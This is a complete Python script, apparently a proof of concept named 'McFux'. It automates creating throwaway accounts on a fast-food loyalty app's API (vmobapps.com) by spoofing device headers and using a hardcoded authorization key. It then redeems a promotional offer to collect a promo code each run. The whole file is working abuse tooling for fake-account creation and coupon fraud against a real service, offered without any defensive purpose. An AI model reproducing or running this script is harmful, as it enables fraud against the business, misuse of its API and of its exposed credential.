import requests
import string
import random

class McFux():

    #Util function
    def randomString(self, stringLength):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(stringLength))

    def generate_code(self):
        print("[i] Creating new random account...")
        self.random_email = self.randomString(5).lower() + "@" + self.randomString(5).lower() + "." + self.randomString(2).lower()
        self.random_password = self.randomString(25)
        self.random_uid = self.randomString(54) + "==_"
        self.random_starter_bearer = "bearer " + self.randomString(64)
        self.success_bearer = ""
        self.promo_code = ""
        self.random_name = self.randomString(10)
        self.random_surname = self.randomString(10)
        self.vmob_mobile = self.randomString(10)
        self.vmob_device = self.randomString(10)
        self.user_agent = self.randomString(86)


        print("[i] Fake user infos:")
        print("[i] Username: " + self.random_email)
        print("[i] Password: " + self.random_password)
        print("[i] UID: " + self.random_uid)
        print("[i] User agent: " + self.user_agent)

        headers = {
            'x-vmob-location_accuracy': '',
            'x-vmob-beacons': '',
            'Accept': 'application/json',
            'x-vmob-device_os_version': '',
            'x-vmob-device_type': 'a',
            'x-vmob-uid': self.random_uid,
            'x-vmob-cost-center': 'merchantId587',
            'x-vmob-authorization': '5853342c-d3ef-421c-b23d-5c6036b8ebd5',
            'x-vmob-device_timezone_id': 'GMT',
            'x-vmob-device_screen_resolution': '',
            'x-vmob-mobile_operator': self.vmob_mobile,
            'Authorization': self.random_starter_bearer,
            'x-vmob-device': self.vmob_device,
            'x-vmob-location_longitude': '',
            'x-vmob-location_latitude': '',
            'x-vmob-sdk_version': '4.36.3',
            'x-vmob-device_network_type': '',
            'Accept-Language': 'it-IT',
            'x-vmob-device_utc_offset': '-0:00',
            'x-vmob-application_version': '2530',
            'Content-Type': 'application/json',
            'User-Agent': self.user_agent,
            'Host': 'con-west-europe-gma.vmobapps.com',
        }

        data = '{"emailRegistration":{"emailAddress":"' + self.random_email + '","firstName":"' + self.random_name + '","gender":"","lastName":"' + self.random_surname + '","password":"'+ self.random_password +'","tagValueAddReferenceCodes":["merchantId587"]},"grant_type":"password","password":"' + self.random_password + '","username":"' + self.random_email + '"}'
        response = requests.post('https://con-west-europe-gma.vmobapps.com/v3/emailRegistrations', headers=headers, data=data)
        if(response.status_code == 200):
            self.success_bearer = "bearer " + response.json()['access_token']
            print("[i] Success!", self.success_bearer)
        else:
            print("[e] Error while getting bearer! error code " + str(response.status_code))
            print(response.content.decode())
            quit()
        


        print("[i] Obtaining promo code...")

        headers = {
            'x-vmob-location_accuracy': '',
            'x-vmob-beacons': '',
            'Accept': 'application/json',
            'x-vmob-device_os_version': '',
            'x-vmob-device_type': 'a',
            'x-vmob-uid': self.random_uid,
            'x-vmob-cost-center': 'merchantId587',
            'x-vmob-authorization': '5853342c-d3ef-421c-b23d-5c6036b8ebd5',
            'x-vmob-device_timezone_id': 'GMT',
            'x-vmob-device_screen_resolution': '',
            'x-vmob-mobile_operator': self.vmob_mobile,
            'Authorization': self.success_bearer,
            'x-vmob-device': self.vmob_device,
            'x-vmob-location_longitude': '',
            'x-vmob-location_latitude': '',
            'x-vmob-sdk_version': '4.36.3',
            'x-vmob-device_network_type': '',
            'Accept-Language': 'it-IT',
            'x-vmob-device_utc_offset': '-0:00',
            'x-vmob-application_version': '2484',
            'Content-Type': 'application/json',
            'User-Agent': self.user_agent,
            'Host': 'con-west-europe-gma.vmobapps.com',
        }

        data = '{"offerInstanceUniqueId":"14706","offerId":14706}'

        response = requests.post('https://con-west-europe-gma.vmobapps.com/v3/consumers/redeemedOffers', headers=headers, data=data)

        if response.status_code == 200:
            self.promo_code = response.json()['redemptionText']
            print("[i] Success! Promo code:", self.promo_code)
        else:
            print("[e] Error while getting the code:", str(response.status_code))
            print(response.json())
            quit()
        


print("McFux // ~0xf77 \n")
poc = McFux()
poc.generate_code()
